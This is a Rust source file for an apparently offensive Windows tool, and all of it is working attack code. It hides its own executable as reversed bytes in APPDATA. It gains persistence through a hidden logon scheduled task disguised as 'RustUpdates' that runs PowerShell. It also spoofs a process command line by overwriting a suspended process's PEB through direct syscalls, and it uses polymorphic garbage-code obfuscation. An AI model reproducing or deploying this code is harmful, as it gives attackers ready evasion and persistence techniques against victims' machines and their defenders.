#![allow(non_snake_case)]
mod syscalls;
use crate::syscalls::SYSCALLS;
use std::env;
use std::fs;
use std::mem::{size_of, zeroed};
use std::process::Command;
use std::ptr::null_mut;
use rustpolymorphic::polymorph;
use std::ffi::c_void;
use windows_sys::Win32::System::Threading::{
    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, PEB, PROCESS_BASIC_INFORMATION,
    PROCESS_INFORMATION_CLASS, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
};
use windows_sys::Win32::Foundation::{UNICODE_STRING, NTSTATUS};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;

#[polymorph(fn_len = 10, garbage = true)]
fn to_wide_chars(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}
#[polymorph(fn_len = 10, garbage = true)]
fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
    let mut wide = to_wide_chars(s);
    if wide.len() < total_width {
        wide.resize(total_width, padding_char);
    }
    wide
}
use is_elevated::is_elevated;

#[polymorph(fn_len = 10, garbage = true)]
fn main() {
    let startup = true;
    if startup {
        if !is_elevated() {
            println!("This program requires administrator privileges to run.");
            return;
        }
        if let Ok(current_exe) = env::current_exe() {
            if let Ok(mut exe_contents) = fs::read(&current_exe) {
                exe_contents.reverse();
                if let Ok(appdata) = env::var("APPDATA") {
                    let dest_path = format!("{}\\update.txt", appdata);
                    if fs::write(&dest_path, &exe_contents).is_ok() {
                        let ps_command = format!(
                            "$bytes = [System.IO.File]::ReadAllBytes('{0}'); [System.Array]::Reverse($bytes); [System.IO.File]::WriteAllBytes('{0}.exe', $bytes); Start-Process '{0}.exe'",
                            dest_path
                        );
                        let output = Command::new("schtasks")
                            .args(&[
                                "/create",
                                "/sc", "onlogon",
                                "/tn", "RustUpdates",
                                "/tr", &format!("powershell.exe -WindowStyle hidden -Command \"{}\"", ps_command),
                                "/f",
                            ])
                            .output()
                            .expect("failed to execute process");
                        println!("status: {}", String::from_utf8_lossy(&output.stdout));
                        println!("error: {}", String::from_utf8_lossy(&output.stderr));
                    }
                }
            }
        }
    }
    let malicious_command = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
    let malicious_command_wide = to_wide_chars(malicious_command);

    let spoofed_command_str = "powershell.exe";
    let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
    spoofed_command_wide.push(0);

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    let mut sa: SECURITY_ATTRIBUTES = unsafe { zeroed() };
    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let mut current_dir = to_wide_chars("C:\\windows\\");
    current_dir.push(0);

    let success = unsafe {
        CreateProcessW(
            null_mut(),
            spoofed_command_wide.as_mut_ptr(),
            &mut sa,
            &mut sa,
            0,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            null_mut(),
            current_dir.as_ptr(),
            &mut si,
            &mut pi,
        )
    };
	
    if success == 0 {
        println!("CreateProcessW failed");
        return;
    }
	
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let mut return_length: u32 = 0;

    let status: NTSTATUS =
        (SYSCALLS.NtQueryInformationProcess)(
            pi.hProcess as *mut c_void,
            0 as PROCESS_INFORMATION_CLASS,
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length
        );

    if status != 0 {
        println!("NtQueryInformationProcess failed");
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let mut peb: PEB = unsafe { zeroed() };
    let mut bytes_read: usize = 0;

    let status = unsafe {
        (SYSCALLS.NtReadVirtualMemory)(
            pi.hProcess as *mut c_void,
            pbi.PebBaseAddress as *mut c_void,
            &mut peb as *mut _ as *mut c_void,
            size_of::<PEB>(),
            &mut bytes_read
        )
    };

    if status != 0 || bytes_read != size_of::<PEB>() {
        println!("NtReadVirtualMemory for PEB failed");
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    #[repr(C)]
    struct Params {
        _filler: [u8; 0x70],
        CommandLine: UNICODE_STRING,
    }
    let mut proc_params: Params = unsafe { zeroed() };
    let status = unsafe {
        (SYSCALLS.NtReadVirtualMemory)(
            pi.hProcess as *mut c_void,
            peb.ProcessParameters as *mut c_void,
            &mut proc_params as *mut _ as *mut c_void,
            size_of::<Params>(),
            &mut bytes_read
        )
    };

    if status != 0 || bytes_read != size_of::<Params>() {
        println!("NtReadVirtualMemory for ProcessParameters failed");
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let mut bytes_written: usize = 0;
    let status = unsafe {
        (SYSCALLS.NtWriteVirtualMemory)(
            pi.hProcess as *mut c_void,
            proc_params.CommandLine.Buffer as *mut c_void,
            malicious_command_wide.as_ptr() as *mut c_void,
            malicious_command_wide.len() * 2,
            &mut bytes_written
        )
    };

    if status != 0 {
        println!("NtWriteVirtualMemory for command line failed");
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let cmd_line_len = (spoofed_command_str.len() * 2) as u16;

    let status = unsafe {
        let len_address = (peb.ProcessParameters as *mut u8).add(0x70);
        (SYSCALLS.NtWriteVirtualMemory)(
            pi.hProcess as *mut c_void,
            len_address as *mut c_void,
            &cmd_line_len as *const _ as *mut c_void,
            size_of::<u16>(),
            &mut bytes_written
        )
    };

    if status != 0 {
        println!("NtWriteVirtualMemory for command line length failed");
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    unsafe {
        let mut suspend_count: u32 = 0;
        let _ = (SYSCALLS.NtResumeThread)(pi.hThread as *mut c_void, &mut suspend_count);
        let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
        let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
    }
}
